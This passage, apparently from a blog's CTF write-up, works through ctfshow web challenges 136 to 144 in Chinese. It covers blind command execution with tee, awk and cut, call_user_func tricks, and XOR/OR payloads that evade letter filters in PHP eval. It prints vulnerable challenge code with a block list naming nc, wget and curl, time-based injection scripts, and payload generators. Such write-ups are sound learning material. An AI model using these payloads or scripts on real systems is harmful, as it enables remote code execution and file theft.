+<h2 id="1-37-Web-136-—-无回显命令执行-—-ls-tee-xxx"><a href="#1-37-Web-136-—-无回显命令执行-—-ls-tee-xxx" class="headerlink" title="1.37 Web 136 — 无回显命令执行 — ls|tee xxx"></a>1.37 Web 136 — 无回显命令执行 — ls|tee xxx</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);<span class="keyword">function</span> check(<span class="variable">$x</span>)&#123;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;        die(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);    &#125;&#125;<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    check(<span class="variable">$c</span>);    <span class="built_in">exec</span>(<span class="variable">$c</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);&#125;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/02/Z7J62hxmCTvAteF.png" alt="image-20210802141126957"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls|tee xxx</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tee 命令  https://linux.cn/article-9435-1.htmlping www.baidu.com | tee 1.txt将正在执行命令的输出内容 写入 指定文件当中# 追加写入ping www.baidu.com | tee -a 1.txt# 写入多个文件当中ping www.baidu.com | tee 1.txt 2.txt 3.txtls | tee  2.txt 3.txt 4.txt # 让 tee 命令的输出内容直接作为另一个命令的输入内容 root@kali:/var/www/html/learn# ls *.txt | tee 5.txt | wc -l4</span></span><br></pre></td></tr></table></figure>
+
+<p>参考  <a target="_blank" rel="noopener" href="https://linux.cn/article-9435-1.html">https://linux.cn/article-9435-1.html</a></p>
+<p><img src="https://i.loli.net/2021/08/02/KYJ9kCDABHOGc6i.png" alt="image-20210802141608591"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls|tee xxx		<span class="comment"># 后访问 /xxx 将文件下载下来 得到当前目录之下 仅仅有 index.php</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/10/01/2pMsh8HFcSCoezb.png" alt="image-20210802142340473"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls /|tee 111</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/02/pdDAr1YcaRwMWsI.png" alt="image-20210802142541986"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=cat /f149_15_h3r3|tee 222</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/02/l87FYHj2x4WBC13.png" alt="image-20210802142703282"></p>
+<h2 id="1-38-Web-137-—-call-user-func-传递-字符串-—-类名-函数名"><a href="#1-38-Web-137-—-call-user-func-传递-字符串-—-类名-函数名" class="headerlink" title="1.38 Web 137 — call_user_func() 传递 字符串 — 类名::函数名"></a>1.38 Web 137 — call_user_func() 传递 字符串 — 类名::函数名</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow&#123;    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;        die(<span class="string">&quot;private class&quot;</span>);    &#125;    static <span class="keyword">function</span> <span class="function"><span class="title">getFlag</span></span>()&#123;        <span class="built_in">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);    &#125;&#125;call_user_func(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payloadctfshow=ctfshow::getFlagctfshow=ctfshow-&gt;getFlag	#不可行</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>php中 -&gt;与:: 调用类中的成员的区别</strong><br><strong>-&gt;    用于动态语境处理某个类的某个实例</strong><br><strong>::    可以调用一个静态的、不依赖于其他初始化的类方法.</strong></p>
+<p>也就是说双冒号可以不用实例化类就可以直接调用类中的方法</p>
+</blockquote>
+<h2 id="1-39-Web-138-—-call-user-func-传递-数组-—-不使用"><a href="#1-39-Web-138-—-call-user-func-传递-数组-—-不使用" class="headerlink" title="1.39 Web 138 — call_user_func() 传递 数组 — 不使用 ::"></a>1.39 Web 138 — call_user_func() 传递 数组 — 不使用 ::</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow&#123;    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;        die(<span class="string">&quot;private class&quot;</span>);    &#125;    static <span class="keyword">function</span> <span class="function"><span class="title">getFlag</span></span>()&#123;        <span class="built_in">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);    &#125;&#125;<span class="keyword">if</span>(strripos(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;-1)&#123;    die(<span class="string">&quot;private function&quot;</span>);&#125;call_user_func(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/02/G7B1UmwbYlqMVar.png" alt="image-20210802143748059"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 函数传参&lt;?phpfunction barber($type)&#123;    echo &quot;You wanted a $type haircut, no problem\n&quot;;&#125;call_user_func(&#x27;barber&#x27;, &quot;mushroom&quot;);call_user_func(&#x27;barber&#x27;, &quot;shave&quot;);?&gt; //You wanted a mushroom haircut, no problem//You wanted a shave haircut, no problem# 类传方法&lt;?phpclass myclass &#123;    static function say_hello()    &#123;        echo &quot;Hello!\n&quot;;    &#125;&#125;$classname = &quot;myclass&quot;;call_user_func(array($classname, &#x27;say_hello&#x27;));call_user_func($classname .&#x27;::say_hello&#x27;); // As of 5.2.3$myobject = new myclass();call_user_func(array($myobject, &#x27;say_hello&#x27;));?&gt; </span></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-40-Web-139-—-无回显命令注入-—-awk、cut-盲注"><a href="#1-40-Web-139-—-无回显命令注入-—-awk、cut-盲注" class="headerlink" title="1.40 Web 139 — 无回显命令注入 — awk、cut 盲注"></a>1.40 Web 139 — 无回显命令注入 — awk、cut 盲注</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);<span class="keyword">function</span> check(<span class="variable">$x</span>)&#123;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;        die(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);    &#125;&#125;<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    check(<span class="variable">$c</span>);    <span class="built_in">exec</span>(<span class="variable">$c</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);&#125;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>awk  cut  盲注 命令：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面/111<span class="comment"># vi flag.phproot@kali:~/桌面/111# cat flag.php test1test2test3flag&#123;qwertyui&#125;root@kali:~/桌面/111# cat flag.php | awk NR==1test1root@kali:~/桌面/111# cat flag.php | awk NR==2test2root@kali:~/桌面/111# cat flag.php | awk NR==3test3root@kali:~/桌面/111# cat flag.php | awk NR==4flag&#123;qwertyui&#125;root@kali:~/桌面/111# cat flag.php | awk nr==4root@kali:~/桌面/111# cat flag.php | awk NR==4 | cut -c 1froot@kali:~/桌面/111# cat flag.php | awk NR==4 | cut -c 2lroot@kali:~/桌面/111# cat flag.php | awk NR==4 | cut -c 3aroot@kali:~/桌面/111# cat flag.php | awk NR==4 | cut -c 4groot@kali:~/桌面/111# if [ $(cat flag.php|awk NR==1|cut -c 2)==l ];then echo success;fi                                                             success                                                                   root@kali:~/桌面/111# if [ $(cat flag.php|awk NR==1|cut -c 2)==l ];then sleep 2;fi</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/05/iMTXdeNtrVFQKcW.png" alt="image-20210805153710357"></p>
+<p><strong>脚本：查找根目录的内容</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import requestsimport timeimport string<span class="comment">#str=string.ascii_letters+string.digitsstr = &#x27;abcdefghigklmnopqrstuvwxyz_&#123;&#125;0123456789 &#x27;result=&quot;&quot;for i in range(1,10):	key=0	for j in range(1,50):		if key==1:			break		#for n in range(32,128):		for n in str:			#n=chr(n)			#payload=&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n)			payload=&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n)			#print(payload)			url=&quot;http://4b941830-8b3f-49bd-8aa8-0d35e2d2d486.challenge.ctf.show:8080?c=&quot;+payload			try:				requests.get(url,timeout=(2.5,2.5))			except:			    result=result+n			    print(result)			    break			if n==&#x27;9&#x27;:				key=1	result+=&quot; &quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>脚本：查 flag</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import requestsimport timeimport string<span class="comment">#str=string.ascii_letters+string.digitsstr = &#x27;abcdefghigklmnopqrstuvwxyz_&#123;&#125;0123456789 &#x27;result=&quot;&quot;for i in range(1,10):	key=0	for j in range(1,50):		if key==1:			break		#for n in range(32,128):		for n in str:			#n=chr(n)			payload=&quot;if [ `cat /f149_15_h3r3|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n)			#payload=&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n)			#print(payload)			url=&quot;http://4b941830-8b3f-49bd-8aa8-0d35e2d2d486.challenge.ctf.show:8080?c=&quot;+payload			try:				requests.get(url,timeout=(2.5,2.5))			except:			    result=result+n			    print(result)			    break			if n==&#x27;9&#x27;:				key=1	result+=&quot; &quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import requestscmd = <span class="string">&#x27;cat /f149_15_h3r3&#x27;</span>result = <span class="string">&#x27;&#x27;</span><span class="keyword">for</span> i <span class="keyword">in</span> range(1, 10):    <span class="keyword">for</span> j <span class="keyword">in</span> range(1, 50):        <span class="built_in">print</span>(<span class="string">&#x27;i=&#x27;</span>, i, <span class="string">&#x27; j=&#x27;</span>, j)        <span class="keyword">for</span> k <span class="keyword">in</span> range(32, 128):            k = chr(k)            payload = f<span class="string">&quot;if [ `&#123;cmd&#125; |awk NR==&#123;i&#125;|cut -c &#123;j&#125;` == &#123;k&#125; ]; then sleep 3;fi&quot;</span>            payload = <span class="string">&#x27;?c=&#x27;</span> + payload            url = <span class="string">&#x27;http://4b941830-8b3f-49bd-8aa8-0d35e2d2d486.challenge.ctf.show:8080&#x27;</span>            try:                requests.get(url + payload, timeout=(2.5, 2.5))            except:                result = result + k                <span class="built_in">print</span>(result)                <span class="built_in">break</span>    result = result + <span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-41-Web-140-—-intval-code-‘ctfshow’-—-code-eval-“return-f1-f2-”"><a href="#1-41-Web-140-—-intval-code-‘ctfshow’-—-code-eval-“return-f1-f2-”" class="headerlink" title="1.41 Web 140 — intval($code) == ‘ctfshow’ — $code = eval(“return $f1($f2());”);"></a>1.41 Web 140 — intval($code) == ‘ctfshow’ — $code = eval(“return $f1($f2());”);</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>]))&#123;    <span class="variable">$f1</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>];    <span class="variable">$f2</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f1</span>))&#123;        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f2</span>))&#123;            <span class="variable">$code</span> = <span class="built_in">eval</span>(<span class="string">&quot;return <span class="variable">$f1</span>(<span class="variable">$f2</span>());&quot;</span>);            <span class="keyword">if</span>(intval(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;                <span class="built_in">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);            &#125;        &#125;    &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们的目的是 ，而且只能使用 字母和数字进行构造</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="built_in">eval</span>(<span class="string">&quot;return <span class="variable">$f1</span>(<span class="variable">$f2</span>());&quot;</span>);<span class="keyword">if</span>(intval(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;      <span class="built_in">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);&#125;<span class="comment"># intval() == 弱类型比较，只要让 # $code 为 0 | False | NULL  即可 # 准确的来说，只要不是数字即可</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payloadmd5(phpinfo())	#c4ca4238a0b923820dcc509a6f75849b	#1md5(sleep())	#d41d8cd98f00b204e9800998ecf8427e	#空密码md5(md5())		#d41d8cd98f00b204e9800998ecf8427e	#空密码current(localeconv)sha1(getcwd())#md5(getcwd()) 不可行 #247369500707596003b38cd5879122f6f1=intval&amp;f2=intval	# 0f1=usleep&amp;f2=usleep</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/05/3nXbdCi6fSDqg1p.png" alt="image-20210805161637530"></p>
+<h2 id="1-42-Web-141-—-eval-“return-v1-v3-v2-”"><a href="#1-42-Web-141-—-eval-“return-v1-v3-v2-”" class="headerlink" title="1.42 Web 141 — eval(“return $v1$v3$v2;”);"></a>1.42 Web 141 — eval(“return $v1$v3$v2;”);</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="comment">#error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;    $v1 = (String)$_GET[&#x27;v1&#x27;];    $v2 = (String)$_GET[&#x27;v2&#x27;];    $v3 = (String)$_GET[&#x27;v3&#x27;];    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;        if(preg_match(&#x27;/^\W+$/&#x27;, $v3))&#123;        # v3 不能是 字母、数字、下划线            $code =  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 = &quot;.$code;        &#125;    &#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>\w</strong>      #匹配字母、数字、下划线。等价于 [A-Za-z0-9_] </p>
+</blockquote>
+<p><strong>测试：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>highlight_file(<span class="keyword">__FILE__</span>);<span class="comment"># $code =  eval(&quot;return $v1$v3$v2;&quot;);// eval(&quot;return 1;phpinfo();&quot;);	#不可行// eval(&quot;return 0;phpinfo();&quot;);	#不可行// eval(&quot;return 1-phpinfo();&quot;);	#可行eval(&quot;return 1+phpinfo();&quot;);	#可行eval(&quot;return 2+phpinfo();&quot;);	#可行?&gt;    # 也就是说，数字可以与命令进行运算</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>由于 v1 v2 也只能是 数字，那么我们可以构造 <code>1+phpinfo()+1</code> 等式子</p>
+</li>
+<li><p>v3 不能是 字母、数字、下划线，那么现在如何构造 v3?</p>
+<p>无字母、数字 RCE</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面/脚本<span class="comment"># python re.py输出执行函数:&#x27;system&#x27;请输出函数参数:&#x27;tac f*&#x27;(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;)</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?v1=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# *?v1=1&amp;v3=-(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# -?v1=1&amp;v3=%2b(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# 尝试过后 不能直接用+ 要进行 URL 编码#+?v1=1&amp;v3=^(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# ^?v1=1&amp;v3=%26(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# &amp; %26?v1=1&amp;v3=%2f(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# / 这次竟然 火绒没有拦截</span></span><br></pre></td></tr></table></figure>
+
+<p>也就是说，加减乘除，取反、异或，都可能</p>
+<p><strong>| 拼接 无字母数字脚本</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-# @Time : 20.12.4 23:05# @author:lonmarimport recontent = &#x27;&#x27;preg = &#x27;[a-z]|[0-9]&#x27; # 题目过滤正则# 生成字典for i in range(256):    for j in range(256):        if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):            k = i | j            if 32 &lt;= k &lt;= 126:                a = &#x27;%&#x27; + hex(i)[2:].zfill(2)                b = &#x27;%&#x27; + hex(j)[2:].zfill(2)                content += (chr(k) + &#x27; &#x27; + a + &#x27; &#x27; + b + &#x27;\n&#x27;)f = open(&#x27;rce_or.txt&#x27;, &#x27;w&#x27;)f.write(content)while True:    payload1 = &#x27;&#x27;    payload2 = &#x27;&#x27;    code = input(&quot;data:&quot;)    for i in code:        f = open(&#x27;rce_or.txt&#x27;)        lines = f.readlines()        for line in lines:            if i == line[0]:                payload1 = payload1 + line[2:5]                payload2 = payload2 + line[6:9]                break    payload = &#x27;(&quot;&#x27;+payload1+&#x27;&quot;|&quot;&#x27;+payload2+&#x27;&quot;)&#x27;    print(&quot;payload: &quot;+ payload)</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="1-43-Web-142-—-d-int-v1-0x36d-0x36d-0x36d-0x36d-0x36d"><a href="#1-43-Web-142-—-d-int-v1-0x36d-0x36d-0x36d-0x36d-0x36d" class="headerlink" title="1.43 Web 142 — $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);"></a>1.43 Web 142 — $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>))&#123;        <span class="variable">$d</span> = (int)(<span class="variable">$v1</span> * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);        sleep(<span class="variable">$d</span>);        <span class="built_in">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=0</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-44-Web-143-—-141-plus"><a href="#1-44-Web-143-—-141-plus" class="headerlink" title="1.44 Web 143 — 141 plus"></a>1.44 Web 143 — 141 plus</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">141的plus版本</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;                die(<span class="string">&#x27;get out hacker!&#x27;</span>);        &#125;        <span class="keyword">else</span>&#123;            <span class="variable">$code</span> =  <span class="built_in">eval</span>(<span class="string">&quot;return $v1$v3<span class="variable">$v2</span>;&quot;</span>);            <span class="built_in">echo</span> <span class="string">&quot;$v1$v3<span class="variable">$v2</span> = &quot;</span>.<span class="variable">$code</span>;        &#125;    &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>过滤了一些运算符 <code>+  -  &amp;  %  / ~ $  _  .  </code></li>
+<li>过滤了 <code>;</code>  ，使用 <code>?&gt;</code>  代替</li>
+</ul>
+<p>仍旧有我们可以利用的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?v1=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# *?v1=1&amp;v3=^(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# ^?v1=1&amp;v3=%2f(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# / 这次竟然 火绒没有拦截</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>^异或拼接 无字母数字脚本</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-# @Time : 20.12.4 23:06# @author:lonmarimport recontent = &#x27;&#x27;preg = &#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/&#x27; # 题目过滤正则# 生成字典for i in range(256):    for j in range(256):        if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):            k = i ^ j            if 32 &lt;= k &lt;= 126:                a = &#x27;%&#x27; + hex(i)[2:].zfill(2)                b = &#x27;%&#x27; + hex(j)[2:].zfill(2)                content += (chr(k) + &#x27; &#x27; + a + &#x27; &#x27; + b + &#x27;\n&#x27;)f = open(&#x27;exp_xor.txt&#x27;, &#x27;w&#x27;)f.write(content)while True:    payload1 = &#x27;&#x27;    payload2 = &#x27;&#x27;    code = input(&quot;data:&quot;)    for i in code:        f = open(&#x27;rce_or.txt&#x27;)        lines = f.readlines()        for line in lines:            if i == line[0]:                payload1 = payload1 + line[2:5]                payload2 = payload2 + line[6:9]                break    payload = &#x27;(&quot;&#x27;+payload1+&#x27;&quot;^&quot;&#x27;+payload2+&#x27;&quot;)&#x27;    print(&quot;payload: &quot;+ payload)</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="1-45-Web-144-—-143-plus"><a href="#1-45-Web-144-—-143-plus" class="headerlink" title="1.45 Web 144 — 143 plus"></a>1.45 Web 144 — 143 plus</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">143的plus版本</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; check(<span class="variable">$v3</span>))&#123;        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v2</span>))&#123;            <span class="variable">$code</span> =  <span class="built_in">eval</span>(<span class="string">&quot;return $v1$v3<span class="variable">$v2</span>;&quot;</span>);            <span class="built_in">echo</span> <span class="string">&quot;$v1$v3<span class="variable">$v2</span> = &quot;</span>.<span class="variable">$code</span>;        